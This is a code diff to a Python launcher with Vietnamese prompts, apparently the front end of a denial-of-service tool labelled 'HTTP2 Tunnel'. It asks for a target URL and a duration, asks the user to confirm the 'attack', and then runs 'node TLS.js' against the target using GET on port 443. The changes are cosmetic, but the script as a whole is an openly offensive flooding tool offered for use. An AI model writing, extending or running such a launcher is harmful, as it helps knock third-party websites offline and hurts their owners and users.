@@ -2,11 +2,11 @@ import os
 from os import name, system
 if name == 'nt':
     system("title Đậu Đậu - HTTP2 Tunnel")
-    system("mode 160, 40")
+    system("mode 101, 25")
 os.system("cls" if os.name == "nt" else "clear")
-jawbreaker = """
+panel = """
   ________  __         ______             __                                                       
- /        |/  |       /      \           /  |                                                      
+ /        |/  |       /      \           /  |                                                 
  $$$$$$$$/ $$ |      /$$$$$$  |         _$$ |_    __    __  _______   _______    ______    ______  
     $$ |   $$ |      $$ \__$$/  ______ / $$   |  /  |  /  |/       \ /       \  /      \  /      \ 
     $$ |   $$ |      $$      \ /      |$$$$$$/   $$ |  $$ |$$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |
@@ -15,21 +15,19 @@ jawbreaker = """
     $$ |   $$       |$$    $$/           $$  $$/ $$    $$/ $$ |  $$ |$$ |  $$ |$$       |$$ |      
     $$/    $$$$$$$$/  $$$$$$/             $$$$/   $$$$$$/  $$/   $$/ $$/   $$/  $$$$$$$/ $$/       
 """
-author = "                                   * * * {} * * *".format("  Đậu Đậu  ")
-print(jawbreaker)
-print(author)
+print(panel)
 host=input("       [+] Nhập URL Taget: ")
 time=int(input("       [+] Nhập Time (s): "))
 print("  =========================================================================")
-print("       Vui lòng xác nhận attack (Enter)")
-input()
+input('       Vui lòng xác nhận attack (Enter)')
 os.system("cls" if os.name == "nt" else "clear")
 print()
 print("  =========================================================================")
 print("       Mục tiêu               =     {}".format(host))
-print("       Thời gian              =     {}".format(time))
+print("       Thời gian              =     {} giây".format(time))
 print("       Methoads (default)     =     GET")
 print("       Cổng (default)         =     443")
 print("  =========================================================================")
 os.system(f"node TLS.js {host} {time}")
-input()
+print("  =========================================================================")
+input('       ấn Enter để thoát')
